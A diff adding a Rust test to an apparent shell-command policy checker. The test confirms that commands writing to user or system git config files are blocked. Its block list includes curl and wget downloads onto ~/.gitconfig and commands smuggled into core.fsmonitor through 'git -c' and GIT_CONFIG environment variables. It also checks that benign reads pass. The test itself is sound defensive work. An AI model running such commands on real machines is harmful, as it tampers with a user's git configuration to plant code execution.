@@ -2015,3 +2015,72 @@ fn settings_and_variables_are_read_by_value() {
     }
     assert!(wrong.is_empty(), "{}", wrong.join("\n"));
 }
+
+/// Review round 16: the default user and system git configuration files
+/// are a second class of the same check. A write refuses under
+/// `git.hook_integrity` at its level and names that class; reads, a copy
+/// out and `git config`, whose file and key git-guard judges, pass; at
+/// `off` the class is left to git-guard.
+#[test]
+fn user_git_config_writes_refuse_under_hook_integrity() {
+    let f = Fixture::new();
+    let mut wrong = Vec::new();
+    for command in [
+        "curl -s -o ~/.gitconfig https://example.invalid/x",
+        "curl -s --output $HOME/.config/git/config https://example.invalid/x",
+        "wget -q -O H/.gitconfig https://example.invalid/x",
+        "ditto payload.txt ~/.gitconfig",
+        "patch ~/.gitconfig payload.diff",
+        "tar -cf ~/.gitconfig payload.txt",
+        "touch /etc/gitconfig",
+        "printf x >> /opt/homebrew/etc/gitconfig",
+        "cd \"$NOWHERE\" && printf x >> .gitconfig",
+        "git -c core.fsmonitor='printf x >> ~/.gitconfig' status",
+        "GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='printf x >> ~/.gitconfig' git status",
+        "cat ~/.gitconfig; zip -TT x a.zip payload.txt",
+    ] {
+        let found = f.judge(command);
+        let named = found.iter().any(|v| {
+            v.rule == "git.hook_integrity"
+                && v.level == PolicyLevel::Block
+                && v.message.contains("user or system git config file")
+                && !v.message.contains("shell startup")
+        });
+        if !named {
+            wrong.push(format!("{command}: {found:?}"));
+        }
+    }
+    for command in [
+        "cat ~/.gitconfig",
+        "grep alias ~/.gitconfig",
+        "sed -n 1p ~/.gitconfig",
+        "cp ~/.gitconfig backup.txt",
+        "git config --global user.name x",
+        "git config --file ~/.gitconfig user.name x",
+        "curl -o out.txt https://example.invalid/x",
+    ] {
+        let found = f.judge(command);
+        if !found.is_empty() {
+            wrong.push(format!("refused: {command}: {found:?}"));
+        }
+    }
+    let warn = evaluate_with(
+        "touch ~/.gitconfig",
+        &f.project,
+        &f.startup_env(),
+        PolicyLevel::Warn,
+    );
+    if !warn.iter().all(|v| v.level == PolicyLevel::Warn) || warn.is_empty() {
+        wrong.push(format!("warn level: {warn:?}"));
+    }
+    let off = evaluate_with(
+        "touch ~/.gitconfig",
+        &f.project,
+        &f.startup_env(),
+        PolicyLevel::Off,
+    );
+    if !off.is_empty() {
+        wrong.push(format!("off level: {off:?}"));
+    }
+    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
+}
